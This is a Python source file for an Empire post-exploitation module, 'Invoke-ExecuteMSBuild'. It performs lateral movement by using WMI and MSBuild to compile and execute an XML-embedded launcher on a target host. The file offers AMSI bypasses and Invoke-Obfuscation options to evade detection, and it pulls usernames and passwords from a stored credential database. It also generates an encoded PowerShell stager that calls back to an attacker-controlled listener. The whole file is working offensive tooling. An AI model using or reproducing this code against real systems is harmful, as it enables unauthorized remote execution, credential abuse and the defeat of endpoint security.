from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers

class Module(object):

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Invoke-ExecuteMSBuild',

            # list of one or more authors for the module
            'Author': ['@xorrior'],

            # more verbose multi-line description of the module
            'Description': ('This module utilizes WMI and MSBuild to compile and execute an xml file containing an Empire launcher'),

            'Software': '',

            'Techniques': ['T1127', 'T1047'],

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the language for this module
            'Language' : 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion' : '2',

            # list of any references/other comments
            'Comments': [
                'Inspired by @subtee',
                'http://subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html'
            ]
        }

        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run module from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Command' : {
                'Description'   :   'Custom command to run.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False'
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'AMSIBypass': {
                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'True'
            },
            'AMSIBypass2': {
                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
                'Required': False,
                'Value': 'False'
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ComputerName' : {
                'Description'   :   'Host to target',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   'UserName if executing with credentials',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password if executing with credentials',
                'Required'      :   False,
                'Value'         :   ''
            },
            'FilePath' : {
                'Description'   :   'Desired location to copy the xml file on the target',
                'Required'      :   False,
                'Value'         :   ''
            },
            'DriveLetter' : {
                'Description'   :   'Drive letter to use when mounting the share locally',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # Set booleans to false by default
        Obfuscate = False
        AMSIBypass = False
        AMSIBypass2 = False

        listenerName = self.options['Listener']['Value']
        command = self.options['Command']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        if (self.options['Obfuscate']['Value']).lower() == 'true':
            Obfuscate = True
        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
        if (self.options['AMSIBypass']['Value']).lower() == 'true':
            AMSIBypass = True
        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
            AMSIBypass2 = True

        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-ExecuteMSBuild.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "Invoke-ExecuteMSBuild"
        credID = self.options["CredID"]['Value']
        if credID != "":

            if not self.mainMenu.credentials.is_credential_valid(credID):
                print(helpers.color("[!] CredID is invalid!"))
                return ""

            (credID, credType, domainName, userName, password, host, os, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if domainName != "":
                self.options["UserName"]['Value'] = str(domainName) + "\\" + str(userName)
            else:
                self.options["UserName"]['Value'] = str(userName)
            if password != "":
                self.options["Password"]['Value'] = password

        # Only "Command" or "Listener" but not both
        if (listenerName == "" and command  == ""):
          print(helpers.color("[!] Listener or Command required"))
          return ""
        if (listenerName and command):
          print(helpers.color("[!] Cannot use Listener and Command at the same time"))
          return ""

        if not self.mainMenu.listeners.is_listener_valid(listenerName) and not command:
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listenerName))
            return ""
        elif listenerName:

            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
                                                               obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand,
                                                               userAgent=userAgent, proxy=proxy,
                                                               proxyCreds=proxyCreds, AMSIBypass=AMSIBypass,
                                                   AMSIBypass2=AMSIBypass2)
            if launcher == "":
                return ""
            else:
                launcher = launcher.replace('$','`$')
                script = script.replace('LAUNCHER',launcher)
        else:
            Cmd = command.replace('"','`"').replace('$','`$')
            script = script.replace('LAUNCHER',Cmd)
            print(helpers.color("[*] Running command:  " + command))


        # add any arguments to the end execution of the script
        scriptEnd += " -ComputerName " + self.options['ComputerName']['Value']

        if self.options['UserName']['Value'] != "":
            scriptEnd += " -UserName \"" + self.options['UserName']['Value'] + "\" -Password \"" + self.options['Password']['Value'] + "\""

        if self.options['DriveLetter']['Value']:
            scriptEnd += " -DriveLetter \"" + self.options['DriveLetter']['Value'] + "\""

        if self.options['FilePath']['Value']:
            scriptEnd += " -FilePath \"" + self.options['FilePath']['Value'] + "\""

        scriptEnd += " | Out-String"

        # Get the random function name generated at install and patch the stager with the proper function name
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)

        return script
